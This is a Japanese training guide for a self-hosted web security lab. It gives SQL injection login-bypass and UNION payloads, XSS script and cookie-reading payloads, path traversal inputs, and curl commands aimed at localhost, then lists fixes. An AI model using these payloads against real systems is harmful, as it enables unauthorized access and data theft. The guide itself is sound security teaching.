# 🔓 攻撃テストガイド

このガイドでは、自分で作成したサーバーで安全にセキュリティ攻撃を試す方法を説明します。

## ⚠️ 重要な注意事項

- **このサーバーはあなた自身が作成・管理しているため、攻撃テストは完全に合法です**
- ただし、**他の人のサーバーや本番環境でテストすることは絶対に禁止**されています
- 学習目的でのみ使用してください

---

## 🎯 利用可能な攻撃練習環境

### 1. SQLインジェクション練習
**URL**: `http://localhost:3000/sql_index.html`

#### 攻撃方法

**A. パスワードを無視してログイン**
- ユーザー名: `admin' OR '1'='1`
- パスワード: （任意、空でも可）

**B. コメントアウトでログイン**
- ユーザー名: `admin' --`
- パスワード: （空）

**C. UNION攻撃（検索機能で試す）**
- 検索キーワード: `' UNION SELECT * FROM users --`

**D. すべてのユーザーを取得**
- 検索キーワード: `' OR '1'='1`

#### 実際の試し方

1. ブラウザで `http://localhost:3000/sql_index.html` を開く
2. ログインセクションで以下を試す:
   ```
   ユーザー名: admin' OR '1'='1
   パスワード: 任意
   ```
3. 「ログイン」ボタンをクリック
4. 実行されたSQLクエリが表示されるので、どのように注入されたか確認

### 2. XSS（Cross-Site Scripting）練習
**URL**: `http://localhost:3000/xss_index.html`

#### 攻撃方法

**A. 基本的なアラート**
- 投稿内容: `<script>alert('XSS')</script>`

**B. リダイレクト攻撃**
- 投稿内容: `<script>window.location.href='/xss/attack-success'</script>`

**C. Cookie取得**
- 投稿内容: `<script>alert(document.cookie)</script>`

**D. イベントハンドラを使用**
- 投稿内容: `<img src=x onerror=alert('XSS')>`

#### 実際の試し方

1. ブラウザで `http://localhost:3000/xss_index.html` を開く
2. 投稿者名に適当な名前を入力
3. 投稿内容にXSSペイロードを入力（例: `<script>alert('XSS')</script>`）
4. 「投稿する」をクリック
5. 「投稿を読み込む」をクリックすると、XSSが実行される

### 3. パストラバーサル練習
**URL**: `http://localhost:3000/path-traversal_index.html`

#### 攻撃方法

**A. フラグファイルを取得**
- ファイルパス: `../flag.txt`

**B. 複数階層を遡る**
- ファイルパス: `../../flag.txt`

**C. 別のディレクトリのファイルを取得**
- ファイルパス: `../public/flag.txt`

#### 実際の試し方

1. ブラウザで `http://localhost:3000/path-traversal_index.html` を開く
2. ファイルパスに `../flag.txt` を入力
3. 「ファイルをダウンロード」をクリック
4. フラグファイルの内容が表示される

---

## 🛠️ コマンドラインでのテスト

### curlを使用したSQLインジェクション攻撃

#### ログイン攻撃
```bash
# パスワードを無視する攻撃
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"admin' OR '1'='1\",\"password\":\"test\"}"
```

#### 検索攻撃
```bash
# すべてのユーザーを取得
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d "{\"search\":\"' OR '1'='1\"}"
```

### curlを使用したパストラバーサル攻撃

```bash
# フラグファイルを取得
curl "http://localhost:3000/path-traversal/download?file=../flag.txt"
```

---

## 📊 攻撃結果の確認方法

### SQLインジェクション
- レスポンスに `query` フィールドが含まれ、実行されたSQLが表示されます
- `success: true` の場合、攻撃が成功しています
- ユーザー情報が返ってくる場合、認証をバイパスできています

### XSS
- ブラウザでJavaScriptが実行されます（アラートが表示される等）
- `/xss/attack-success` にリダイレクトされた場合、攻撃が成功しています

### パストラバーサル
- フラグファイルの内容が表示されます
- `flag.txt` の内容が取得できれば成功です

---

## 🔍 サーバーログの確認

サーバーのコンソールで以下の情報を確認できます：
- 実行されたSQLクエリ
- エラーメッセージ
- アクセスログ

---

## 📝 学習のポイント

1. **SQLインジェクション**
   - ユーザー入力を直接SQLに埋め込む危険性
   - パラメータ化クエリの重要性
   - OR条件を使った認証バイパス

2. **XSS**
   - `innerHTML` の危険性
   - `textContent` を使用した安全な実装
   - 入力値のサニタイゼーション

3. **パストラバーサル**
   - パスの検証の重要性
   - `path.resolve()` を使った安全な実装
   - ディレクトリ制限の実装

---

## 🎓 次のステップ

攻撃が成功したら、以下の対策を実装してみましょう：

1. **SQLインジェクション対策**
   - パラメータ化クエリの実装（`routes/auth.js` を参考に）

2. **XSS対策**
   - `innerHTML` を `textContent` に変更
   - 入力値のエスケープ処理

3. **パストラバーサル対策**
   - `path.resolve()` を使ったパス検証
   - 許可されたディレクトリのみアクセス可能にする

---

## 📚 参考資料

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- SQLインジェクション: https://owasp.org/www-community/attacks/SQL_Injection
- XSS: https://owasp.org/www-community/attacks/xss/
- パストラバーサル: https://owasp.org/www-community/attacks/Path_Traversal

